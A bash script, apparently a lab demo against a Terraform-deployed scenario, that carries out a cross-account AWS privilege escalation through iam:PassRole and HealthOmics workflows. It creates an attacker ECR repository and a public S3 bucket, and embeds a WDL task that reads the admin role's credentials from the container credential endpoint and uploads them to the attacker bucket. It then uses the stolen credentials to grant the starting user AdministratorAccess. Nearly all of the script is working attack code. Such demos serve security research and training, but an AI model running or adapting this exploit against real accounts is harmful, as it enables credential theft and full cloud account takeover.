#!/bin/bash

# Cross-account demo script for iam:PassRole + omics:CreateWorkflow + omics:StartRun privilege escalation
# This variant hosts the aws-cli container image in an attacker-controlled ECR repository (separate
# AWS account) and exfiltrates credentials to an attacker-controlled S3 bucket, proving the exploit
# works with externally-hosted artifacts across account boundaries.
#
# Prerequisites:
#   - Docker installed and running (used to pull public aws-cli image and push to attacker ECR)
#   - AWS profile "demo-attacker.AWSAdministratorAccess" configured
#   - omics-001 scenario deployed via Terraform

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    echo -e "${DIM}\$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    echo -e "\n${CYAN}\$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-omics-001-to-admin-starting-user"
ADMIN_ROLE_NAME="pl-prod-omics-001-to-admin-admin-role"
WORKFLOW_NAME="pl-prod-omics-001-to-admin-workflow"
ATTACKER_PROFILE="demo-attacker.AWSAdministratorAccess"
ATTACKER_ECR_REPO_NAME="pl-attacker-omics-001-aws-cli"

# Attacker resource state (used by cleanup trap)
ATTACKER_ECR_REPO_CREATED=false
ATTACKER_BUCKET_CREATED=false
ATTACKER_BUCKET_NAME=""

# Cleanup attacker resources on exit (success or failure)
cleanup_attacker_resources() {
    if [ "$ATTACKER_ECR_REPO_CREATED" = true ]; then
        echo -e "\n${YELLOW}Cleaning up attacker ECR repo: $ATTACKER_ECR_REPO_NAME${NC}"
        aws ecr delete-repository \
            --repository-name "$ATTACKER_ECR_REPO_NAME" \
            --force \
            --profile "$ATTACKER_PROFILE" \
            --region "$AWS_REGION" 2>/dev/null
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}Attacker ECR repo deleted${NC}"
        else
            echo -e "${YELLOW}Warning: Could not delete attacker ECR repo $ATTACKER_ECR_REPO_NAME${NC}"
            echo "  Manual cleanup: aws ecr delete-repository --repository-name $ATTACKER_ECR_REPO_NAME --force --profile $ATTACKER_PROFILE --region $AWS_REGION"
        fi
    fi

    if [ "$ATTACKER_BUCKET_CREATED" = true ] && [ -n "$ATTACKER_BUCKET_NAME" ]; then
        echo -e "\n${YELLOW}Cleaning up attacker bucket: $ATTACKER_BUCKET_NAME${NC}"
        aws s3 rm "s3://$ATTACKER_BUCKET_NAME" --recursive --profile "$ATTACKER_PROFILE" 2>/dev/null
        aws s3api delete-bucket --bucket "$ATTACKER_BUCKET_NAME" --profile "$ATTACKER_PROFILE" 2>/dev/null
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}Attacker bucket deleted${NC}"
        else
            echo -e "${YELLOW}Warning: Could not delete attacker bucket $ATTACKER_BUCKET_NAME${NC}"
            echo "  Manual cleanup: aws s3 rb s3://$ATTACKER_BUCKET_NAME --force --profile $ATTACKER_PROFILE"
        fi
    fi
}
trap cleanup_attacker_resources EXIT

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + HealthOmics CreateWorkflow + StartRun${NC}"
echo -e "${GREEN}Privilege Escalation Demo (Cross-Account Attacker ECR + S3)${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_omics_001_iam_passrole_omics_createworkflow_omics_startrun.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
# Note: We skip ECR_IMAGE_URI and CODEBUILD_PROJECT -- we use the attacker ECR instead
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
ADMIN_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.admin_role_arn')
S3_BUCKET_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.s3_bucket_name')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Admin Role ARN: $ADMIN_ROLE_ARN"
echo "S3 Bucket (for --output-uri): $S3_BUCKET_NAME"
echo "Region: $AWS_REGION"
echo -e "${GREEN}Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}Verified starting user identity${NC}\n"

# Step 3: Get account IDs (victim + attacker)
echo -e "${YELLOW}Step 3: Getting account IDs${NC}"
show_cmd "aws sts get-caller-identity --query 'Account' --output text"
VICTIM_ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Victim Account ID: $VICTIM_ACCOUNT_ID"

show_cmd "aws sts get-caller-identity --query 'Account' --output text --profile $ATTACKER_PROFILE"
ATTACKER_ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text --profile "$ATTACKER_PROFILE" 2>&1)
if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Could not get attacker account identity using profile '$ATTACKER_PROFILE'${NC}"
    echo "Make sure the AWS profile '$ATTACKER_PROFILE' is configured"
    echo "$ATTACKER_ACCOUNT_ID"
    exit 1
fi
echo "Attacker Account ID: $ATTACKER_ACCOUNT_ID"

ATTACKER_ECR_REGISTRY="${ATTACKER_ACCOUNT_ID}.dkr.ecr.${AWS_REGION}.amazonaws.com"
ATTACKER_BUCKET_NAME="pl-attacker-omics-001-exfil-${ATTACKER_ACCOUNT_ID}"
echo "Attacker ECR Registry: $ATTACKER_ECR_REGISTRY"
echo "Attacker Exfil Bucket: $ATTACKER_BUCKET_NAME"
echo -e "${GREEN}Retrieved account IDs${NC}\n"

# Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
show_cmd "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: Create attacker ECR repo and push aws-cli image
echo -e "${YELLOW}Step 5: Creating attacker ECR repo and pushing container image${NC}"
echo "HealthOmics requires private ECR images. We'll host the image in an attacker-controlled"
echo "ECR repository in a separate AWS account."
echo ""

# 5a: Check Docker prerequisite
echo "Checking Docker availability..."
if ! command -v docker &> /dev/null; then
    echo -e "${RED}Error: Docker is not installed or not in PATH${NC}"
    echo "Docker is required to pull the public aws-cli image and push it to the attacker ECR."
    echo "Install Docker: https://docs.docker.com/get-docker/"
    exit 1
fi

if ! docker info &> /dev/null; then
    echo -e "${RED}Error: Docker daemon is not running${NC}"
    echo "Start Docker and try again."
    exit 1
fi
echo -e "${GREEN}Docker is available${NC}"

# 5b: Create ECR repository in attacker account
echo ""
echo "Creating ECR repository in attacker account..."
show_cmd "aws ecr create-repository --repository-name $ATTACKER_ECR_REPO_NAME --region $AWS_REGION --profile $ATTACKER_PROFILE"
ECR_CREATE_RESULT=$(aws ecr create-repository \
    --repository-name "$ATTACKER_ECR_REPO_NAME" \
    --region "$AWS_REGION" \
    --profile "$ATTACKER_PROFILE" \
    --output json 2>&1)

if [ $? -ne 0 ]; then
    # Check if it already exists
    if echo "$ECR_CREATE_RESULT" | grep -q "RepositoryAlreadyExistsException"; then
        echo -e "${YELLOW}ECR repository already exists, reusing${NC}"
    else
        echo -e "${RED}Error: Failed to create ECR repository in attacker account${NC}"
        echo "$ECR_CREATE_RESULT"
        exit 1
    fi
fi
ATTACKER_ECR_REPO_CREATED=true
echo -e "${GREEN}ECR repository created in attacker account${NC}"

# 5c: Set ECR repository policy to allow HealthOmics to pull images
# Using Option B: Both the omics.amazonaws.com service principal AND the victim account root.
# Option A (service principal alone) does NOT work cross-account -- HealthOmics scopes the
# service principal to the repo's own account, so a cross-account pull requires explicitly
# granting the victim account access.
echo ""
echo "Setting ECR repository policy to allow cross-account HealthOmics image pull..."

ECR_REPO_POLICY=$(cat <<POLICYEOF
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowOmicsImagePull",
            "Effect": "Allow",
            "Principal": {
                "Service": "omics.amazonaws.com",
                "AWS": "arn:aws:iam::${VICTIM_ACCOUNT_ID}:root"
            },
            "Action": [
                "ecr:BatchGetImage",
                "ecr:GetDownloadUrlForLayer"
            ]
        }
    ]
}
POLICYEOF
)

# Option A (service principal only) was tested and FAILS cross-account:
#   "Principal": { "Service": "omics.amazonaws.com" }
#   Error: "Unable to access image URI ... Ensure the ECR private repository exists
#   and has granted access for the omics service principle"
#
# Option C (victim account root only) may also work if HealthOmics uses the run role to pull:
#   "Principal": { "AWS": "arn:aws:iam::${VICTIM_ACCOUNT_ID}:root" }

show_cmd "aws ecr set-repository-policy --repository-name $ATTACKER_ECR_REPO_NAME --policy-text '...' --region $AWS_REGION --profile $ATTACKER_PROFILE"
echo "$ECR_REPO_POLICY" | aws ecr set-repository-policy \
    --repository-name "$ATTACKER_ECR_REPO_NAME" \
    --policy-text file:///dev/stdin \
    --region "$AWS_REGION" \
    --profile "$ATTACKER_PROFILE" > /dev/null 2>&1

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to set ECR repository policy${NC}"
    exit 1
fi
echo -e "${GREEN}ECR repository policy set (omics service + victim account root)${NC}"

# 5d: Docker login to attacker ECR
echo ""
echo "Logging into attacker ECR registry..."
show_cmd "aws ecr get-login-password --region $AWS_REGION --profile $ATTACKER_PROFILE | docker login --username AWS --password-stdin $ATTACKER_ECR_REGISTRY"
aws ecr get-login-password \
    --region "$AWS_REGION" \
    --profile "$ATTACKER_PROFILE" | \
    docker login --username AWS --password-stdin "$ATTACKER_ECR_REGISTRY" 2>&1

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to login to attacker ECR${NC}"
    exit 1
fi
echo -e "${GREEN}Logged into attacker ECR${NC}"

# 5e: Pull public aws-cli image (force amd64 -- HealthOmics runs on x86_64 instances)
echo ""
echo "Pulling public aws-cli image (amd64 -- HealthOmics requires x86_64)..."
show_cmd "docker pull --platform linux/amd64 public.ecr.aws/aws-cli/aws-cli:latest"
docker pull --platform linux/amd64 public.ecr.aws/aws-cli/aws-cli:latest 2>&1

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to pull public aws-cli image${NC}"
    exit 1
fi
echo -e "${GREEN}Pulled aws-cli image (amd64)${NC}"

# 5f: Tag and push to attacker ECR
ATTACKER_ECR_IMAGE_URI="${ATTACKER_ECR_REGISTRY}/${ATTACKER_ECR_REPO_NAME}:latest"
echo ""
echo "Tagging and pushing to attacker ECR..."
show_cmd "docker tag public.ecr.aws/aws-cli/aws-cli:latest $ATTACKER_ECR_IMAGE_URI"
docker tag public.ecr.aws/aws-cli/aws-cli:latest "$ATTACKER_ECR_IMAGE_URI"

show_cmd "docker push $ATTACKER_ECR_IMAGE_URI"
docker push "$ATTACKER_ECR_IMAGE_URI" 2>&1

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to push image to attacker ECR${NC}"
    exit 1
fi
echo -e "${GREEN}Image pushed to attacker ECR: $ATTACKER_ECR_IMAGE_URI${NC}\n"

# Step 5b: Create attacker S3 bucket for credential exfiltration
echo -e "${YELLOW}Step 5b: Creating attacker S3 bucket for credential exfiltration${NC}"
echo "Attacker bucket: $ATTACKER_BUCKET_NAME"
echo "Using attacker profile: $ATTACKER_PROFILE"

# Create the bucket in the attacker account
show_cmd "aws s3api create-bucket --bucket $ATTACKER_BUCKET_NAME --region $AWS_REGION --profile $ATTACKER_PROFILE"
if [ "$AWS_REGION" = "us-east-1" ]; then
    aws s3api create-bucket \
        --bucket "$ATTACKER_BUCKET_NAME" \
        --region "$AWS_REGION" \
        --profile "$ATTACKER_PROFILE" 2>&1
else
    aws s3api create-bucket \
        --bucket "$ATTACKER_BUCKET_NAME" \
        --region "$AWS_REGION" \
        --create-bucket-configuration "LocationConstraint=$AWS_REGION" \
        --profile "$ATTACKER_PROFILE" 2>&1
fi

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to create attacker bucket${NC}"
    exit 1
fi
ATTACKER_BUCKET_CREATED=true
echo -e "${GREEN}Attacker bucket created${NC}"

# Disable S3 Block Public Access on the bucket
echo "Disabling S3 Block Public Access on attacker bucket..."
show_cmd "aws s3api put-public-access-block --bucket $ATTACKER_BUCKET_NAME --public-access-block-configuration BlockPublicAcls=false,IgnorePublicAcls=false,BlockPublicPolicy=false,RestrictPublicBuckets=false --profile $ATTACKER_PROFILE"
aws s3api put-public-access-block \
    --bucket "$ATTACKER_BUCKET_NAME" \
    --public-access-block-configuration "BlockPublicAcls=false,IgnorePublicAcls=false,BlockPublicPolicy=false,RestrictPublicBuckets=false" \
    --profile "$ATTACKER_PROFILE" 2>&1

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to disable S3 Block Public Access on attacker bucket${NC}"
    exit 1
fi
echo -e "${GREEN}S3 Block Public Access disabled on bucket${NC}"

# Apply bucket policy allowing read and write from anyone (for exfiltration)
echo "Applying bucket policy (allows PutObject and GetObject from anyone)..."
BUCKET_POLICY=$(cat <<POLICYEOF
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowExfiltration",
            "Effect": "Allow",
            "Principal": "*",
            "Action": [
                "s3:GetObject",
                "s3:PutObject"
            ],
            "Resource": "arn:aws:s3:::$ATTACKER_BUCKET_NAME/*"
        }
    ]
}
POLICYEOF
)

show_cmd "aws s3api put-bucket-policy --bucket $ATTACKER_BUCKET_NAME --policy '...' --profile $ATTACKER_PROFILE"
echo "$BUCKET_POLICY" | aws s3api put-bucket-policy \
    --bucket "$ATTACKER_BUCKET_NAME" \
    --policy file:///dev/stdin \
    --profile "$ATTACKER_PROFILE" 2>&1

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to apply bucket policy${NC}"
    exit 1
fi
echo -e "${GREEN}Bucket policy applied (GetObject + PutObject for anyone)${NC}\n"

# Step 6: Create malicious WDL workflow definition
echo -e "${YELLOW}Step 6: Creating malicious WDL workflow definition${NC}"
echo "HealthOmics workflow tasks have network isolation - they cannot call IAM APIs directly."
echo "Instead, the exploit exfiltrates the admin run role's temporary credentials"
echo "to the ATTACKER's S3 bucket (which IS accessible from within HealthOmics tasks via"
echo "the public bucket policy), then the attacker retrieves them and uses them locally."
echo ""
echo "Container image: $ATTACKER_ECR_IMAGE_URI (ATTACKER ECR)"
echo "Exfil target: s3://$ATTACKER_BUCKET_NAME/ (ATTACKER BUCKET)"

mkdir -p /tmp/omics-workflow

cat > /tmp/omics-workflow/main.wdl << 'WDLEOF'
version 1.0

workflow ExfiltrateCredentials {
  input {
    String s3_bucket
    String s3_key
  }
  call ExfilTask {
    input:
      s3_bucket = s3_bucket,
      s3_key = s3_key
  }
  output {
    String result = ExfilTask.result
  }
}

task ExfilTask {
  input {
    String s3_bucket
    String s3_key
  }
  command <<<
    # HealthOmics injects credentials via the container credential provider.
    # The aws-cli image has the AWS CLI pre-installed, so we can use it directly
    # to extract the run role's temporary credentials and upload them to S3.

    # Capture the run role's temporary credentials from the credential provider
    CREDS_JSON=$(aws sts get-session-token --output json 2>/dev/null || true)

    # If get-session-token fails (common with assumed role creds), fall back to
    # capturing the credentials directly from the environment/credential provider
    if [ -z "$CREDS_JSON" ] || echo "$CREDS_JSON" | grep -q "error"; then
      # Use the caller identity to confirm we have creds, then extract them
      # from the container credential provider endpoint
      CALLER=$(aws sts get-caller-identity --output json)
      echo "Running as: $(echo $CALLER | grep -o '"Arn":"[^"]*"')"

      # The AWS CLI resolves credentials internally; extract them via env dump
      # HealthOmics provides creds via AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
      if [ -n "$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" ]; then
        CRED_RESPONSE=$(curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI")
        echo "$CRED_RESPONSE" | python3 -c "
import sys, json
d = json.load(sys.stdin)
print(json.dumps({'AccessKeyId': d['AccessKeyId'], 'SecretAccessKey': d['SecretAccessKey'], 'SessionToken': d['Token']}))
" > /tmp/creds.json
      else
        # Fall back to environment variables
        python3 -c "
import os, json
print(json.dumps({'AccessKeyId': os.environ.get('AWS_ACCESS_KEY_ID',''), 'SecretAccessKey': os.environ.get('AWS_SECRET_ACCESS_KEY',''), 'SessionToken': os.environ.get('AWS_SESSION_TOKEN','')}))
" > /tmp/creds.json
      fi
    fi

    # Upload the exfiltrated credentials to the ATTACKER's S3 bucket
    # The bucket has a public policy allowing s3:PutObject from anyone
    aws s3 cp /tmp/creds.json "s3://~{s3_bucket}/~{s3_key}"
    echo "Credentials exfiltrated to s3://~{s3_bucket}/~{s3_key}"
  >>>
  runtime {
    docker: "PLACEHOLDER_ECR_IMAGE_URI"
    memory: "2 GiB"
    cpu: 1
  }
  output {
    String result = "done"
  }
}
WDLEOF

# Substitute the attacker ECR image URI into the WDL
sed -i.bak "s|PLACEHOLDER_ECR_IMAGE_URI|${ATTACKER_ECR_IMAGE_URI}|g" /tmp/omics-workflow/main.wdl
rm -f /tmp/omics-workflow/main.wdl.bak

echo -e "${GREEN}WDL workflow definition created at /tmp/omics-workflow/main.wdl${NC}\n"

# Step 7: Package WDL into a zip and create the workflow
echo -e "${YELLOW}Step 7: Packaging and creating HealthOmics workflow${NC}"
echo "Workflow name: $WORKFLOW_NAME"

# Package the WDL file into a zip
cd /tmp/omics-workflow
zip -j /tmp/omics-workflow.zip main.wdl > /dev/null 2>&1
cd - > /dev/null

show_attack_cmd "aws omics create-workflow --region $AWS_REGION --name $WORKFLOW_NAME --definition-zip fileb:///tmp/omics-workflow.zip --engine WDL --parameter-template '{\"s3_bucket\":{\"description\":\"S3 bucket for credential exfiltration\"},\"s3_key\":{\"description\":\"S3 key for credential output\"}}' --output json"
WORKFLOW_RESULT=$(aws omics create-workflow \
    --region $AWS_REGION \
    --name "$WORKFLOW_NAME" \
    --definition-zip "fileb:///tmp/omics-workflow.zip" \
    --engine WDL \
    --parameter-template '{"s3_bucket":{"description":"S3 bucket for credential exfiltration"},"s3_key":{"description":"S3 key for credential output"}}' \
    --output json)

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to create HealthOmics workflow${NC}"
    rm -rf /tmp/omics-workflow /tmp/omics-workflow.zip
    exit 1
fi

WORKFLOW_ID=$(echo "$WORKFLOW_RESULT" | jq -r '.id')
echo "Workflow ID: $WORKFLOW_ID"
echo -e "${GREEN}HealthOmics workflow created${NC}\n"

# Step 8: Wait for workflow to reach ACTIVE state
echo -e "${YELLOW}Step 8: Waiting for workflow to become ACTIVE${NC}"
echo "Polling workflow state..."

MAX_WAIT=300
ELAPSED=0
while [ $ELAPSED -lt $MAX_WAIT ]; do
    show_cmd "aws omics get-workflow --region $AWS_REGION --id $WORKFLOW_ID --query 'status' --output text"
    WORKFLOW_STATE=$(aws omics get-workflow \
        --region $AWS_REGION \
        --id "$WORKFLOW_ID" \
        --query 'status' \
        --output text)

    echo "Workflow state: $WORKFLOW_STATE"

    if [ "$WORKFLOW_STATE" == "ACTIVE" ]; then
        echo -e "${GREEN}Workflow is ACTIVE${NC}\n"
        break
    fi

    if [ "$WORKFLOW_STATE" == "FAILED" ] || [ "$WORKFLOW_STATE" == "DELETED" ] || [ "$WORKFLOW_STATE" == "INACTIVE" ]; then
        echo -e "${RED}Error: Workflow entered unexpected state: $WORKFLOW_STATE${NC}"
        # Try to get error details
        WORKFLOW_DETAILS=$(aws omics get-workflow \
            --region $AWS_REGION \
            --id "$WORKFLOW_ID" \
            --query 'statusMessage' \
            --output text 2>/dev/null)
        if [ -n "$WORKFLOW_DETAILS" ] && [ "$WORKFLOW_DETAILS" != "None" ]; then
            echo "Details: $WORKFLOW_DETAILS"
        fi
        rm -rf /tmp/omics-workflow /tmp/omics-workflow.zip
        exit 1
    fi

    sleep 15
    ELAPSED=$((ELAPSED + 15))
done

if [ $ELAPSED -ge $MAX_WAIT ]; then
    echo -e "${RED}Error: Timed out waiting for workflow to become ACTIVE${NC}"
    rm -rf /tmp/omics-workflow /tmp/omics-workflow.zip
    exit 1
fi

# Step 9: Start workflow run with admin role (the privilege escalation)
echo -e "${YELLOW}Step 9: Starting workflow run with admin role${NC}"
echo "This is the privilege escalation vector - passing the admin role as the run role..."
echo "Admin Role ARN: $ADMIN_ROLE_ARN"
echo "Credential exfil target: s3://$ATTACKER_BUCKET_NAME/exfil/creds.json (ATTACKER BUCKET)"
echo "HealthOmics output-uri: s3://$S3_BUCKET_NAME/output/ (victim bucket, required by HealthOmics)"

EXFIL_KEY="exfil/creds.json"

show_attack_cmd "aws omics start-run --region $AWS_REGION --workflow-id $WORKFLOW_ID --role-arn $ADMIN_ROLE_ARN --output-uri s3://$S3_BUCKET_NAME/output/ --parameters '{\"s3_bucket\":\"$ATTACKER_BUCKET_NAME\",\"s3_key\":\"$EXFIL_KEY\"}' --output json"
RUN_RESULT=$(aws omics start-run \
    --region $AWS_REGION \
    --workflow-id "$WORKFLOW_ID" \
    --role-arn "$ADMIN_ROLE_ARN" \
    --output-uri "s3://$S3_BUCKET_NAME/output/" \
    --parameters '{"s3_bucket":"'"$ATTACKER_BUCKET_NAME"'","s3_key":"'"$EXFIL_KEY"'"}' \
    --output json)

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to start workflow run${NC}"
    rm -rf /tmp/omics-workflow /tmp/omics-workflow.zip
    exit 1
fi

RUN_ID=$(echo "$RUN_RESULT" | jq -r '.id')
echo "Run ID: $RUN_ID"
echo -e "${GREEN}Workflow run started${NC}\n"

# Step 10: Poll run status until completion
echo -e "${YELLOW}Step 10: Waiting for workflow run to complete${NC}"
echo "Polling run status every 30 seconds (15 minute timeout)..."

MAX_WAIT=900
ELAPSED=0
while [ $ELAPSED -lt $MAX_WAIT ]; do
    show_cmd "aws omics get-run --region $AWS_REGION --id $RUN_ID --query 'status' --output text"
    RUN_STATE=$(aws omics get-run \
        --region $AWS_REGION \
        --id "$RUN_ID" \
        --query 'status' \
        --output text)

    echo "[$((ELAPSED / 60))m $((ELAPSED % 60))s] Run state: $RUN_STATE"

    if [ "$RUN_STATE" == "COMPLETED" ]; then
        echo -e "${GREEN}Workflow run completed successfully!${NC}\n"
        break
    fi

    if [ "$RUN_STATE" == "FAILED" ] || [ "$RUN_STATE" == "CANCELLED" ]; then
        echo -e "${RED}Error: Workflow run entered state: $RUN_STATE${NC}"
        # Attempt to get error details
        RUN_DETAILS=$(aws omics get-run \
            --region $AWS_REGION \
            --id "$RUN_ID" \
            --query 'statusMessage' \
            --output text 2>/dev/null)
        if [ -n "$RUN_DETAILS" ] && [ "$RUN_DETAILS" != "None" ]; then
            echo "Details: $RUN_DETAILS"
        fi
        echo ""
        echo -e "${YELLOW}Possible cause: HealthOmics could not pull the image from the cross-account ECR repo.${NC}"
        echo -e "${YELLOW}The ECR repo policy uses Option B (omics service + victim account root).${NC}"
        echo -e "${YELLOW}If this is an ECR pull failure, try editing Step 5c to use Option C${NC}"
        echo -e "${YELLOW}(victim account root only) to test if HealthOmics uses the run role to pull.${NC}"
        rm -rf /tmp/omics-workflow /tmp/omics-workflow.zip
        exit 1
    fi

    sleep 30
    ELAPSED=$((ELAPSED + 30))
done

if [ $ELAPSED -ge $MAX_WAIT ]; then
    echo -e "${RED}Error: Timed out waiting for workflow run to complete (15 minutes)${NC}"
    echo "Run may still be in progress. Check the HealthOmics console."
    rm -rf /tmp/omics-workflow /tmp/omics-workflow.zip
    exit 1
fi

# Step 11: Retrieve exfiltrated admin credentials from attacker bucket
echo -e "${YELLOW}Step 11: Retrieving exfiltrated admin credentials from attacker bucket${NC}"
echo "The WDL workflow task extracted the admin run role's temporary credentials"
echo "and wrote them to s3://$ATTACKER_BUCKET_NAME/$EXFIL_KEY (attacker-controlled bucket)"
echo "The bucket policy allows public GetObject, so the starting user can read it."

show_cmd "aws s3 cp s3://$ATTACKER_BUCKET_NAME/$EXFIL_KEY /tmp/stolen_creds.json --region $AWS_REGION"
aws s3 cp "s3://$ATTACKER_BUCKET_NAME/$EXFIL_KEY" /tmp/stolen_creds.json \
    --region $AWS_REGION

if [ ! -f /tmp/stolen_creds.json ]; then
    echo -e "${RED}Error: Could not retrieve exfiltrated credentials${NC}"
    rm -rf /tmp/omics-workflow /tmp/omics-workflow.zip
    exit 1
fi

STOLEN_ACCESS_KEY=$(jq -r '.AccessKeyId' /tmp/stolen_creds.json)
STOLEN_SECRET_KEY=$(jq -r '.SecretAccessKey' /tmp/stolen_creds.json)
STOLEN_SESSION_TOKEN=$(jq -r '.SessionToken' /tmp/stolen_creds.json)

echo "Stolen Access Key ID: ${STOLEN_ACCESS_KEY:0:10}..."
echo -e "${GREEN}Retrieved admin role credentials from attacker bucket${NC}\n"

# Step 12: Use stolen admin credentials to attach AdministratorAccess
echo -e "${YELLOW}Step 12: Using stolen admin credentials to escalate privileges${NC}"
echo "Switching to the exfiltrated admin role credentials to call IAM..."

# Temporarily use the stolen admin credentials
export AWS_ACCESS_KEY_ID="$STOLEN_ACCESS_KEY"
export AWS_SECRET_ACCESS_KEY="$STOLEN_SECRET_KEY"
export AWS_SESSION_TOKEN="$STOLEN_SESSION_TOKEN"
# Keep region consistent
export AWS_REGION=$AWS_REGION

# Verify we're now the admin role
show_cmd "aws sts get-caller-identity"
STOLEN_IDENTITY=$(aws sts get-caller-identity --output json 2>&1)
echo "$STOLEN_IDENTITY" | jq '.' 2>/dev/null || echo "$STOLEN_IDENTITY"
echo ""

# Attach AdministratorAccess to the starting user
echo "Attaching AdministratorAccess to $STARTING_USER..."
show_attack_cmd "aws iam attach-user-policy --user-name $STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
aws iam attach-user-policy \
    --user-name "$STARTING_USER" \
    --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"

if [ $? -eq 0 ]; then
    echo -e "${GREEN}AdministratorAccess attached to $STARTING_USER!${NC}"
else
    echo -e "${RED}Error: Failed to attach AdministratorAccess${NC}"
    rm -rf /tmp/omics-workflow /tmp/omics-workflow.zip /tmp/stolen_creds.json
    exit 1
fi
echo ""

# Step 13: Switch back to starting user and verify admin access
echo -e "${YELLOW}Step 13: Verifying privilege escalation${NC}"
echo "Switching back to starting user credentials..."

# Restore starting user credentials
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
unset AWS_SESSION_TOKEN
# Keep region consistent
export AWS_REGION=$AWS_REGION

# Wait for IAM propagation
echo "Waiting 15 seconds for IAM policy to propagate..."
sleep 15

show_cmd "aws iam list-attached-user-policies --user-name $STARTING_USER --output table"
ATTACHED_POLICIES=$(aws iam list-attached-user-policies \
    --user-name "$STARTING_USER" \
    --output json)

ADMIN_ATTACHED=$(echo "$ATTACHED_POLICIES" | jq -r '.AttachedPolicies[] | select(.PolicyArn == "arn:aws:iam::aws:policy/AdministratorAccess") | .PolicyName')

if [ -n "$ADMIN_ATTACHED" ]; then
    echo -e "${GREEN}AdministratorAccess policy confirmed on $STARTING_USER${NC}"
else
    echo -e "${RED}AdministratorAccess not found on user${NC}"
    rm -rf /tmp/omics-workflow /tmp/omics-workflow.zip /tmp/stolen_creds.json
    exit 1
fi
echo ""

echo "Attempting to list IAM users..."
show_cmd "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}Successfully listed IAM users!${NC}"
    echo -e "${GREEN}ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}Failed to list users${NC}"
    rm -rf /tmp/omics-workflow /tmp/omics-workflow.zip /tmp/stolen_creds.json
    exit 1
fi
echo ""

# Clean up temporary files
rm -rf /tmp/omics-workflow /tmp/omics-workflow.zip /tmp/stolen_creds.json

# Final summary
echo -e "\n${GREEN}========================================${NC}"
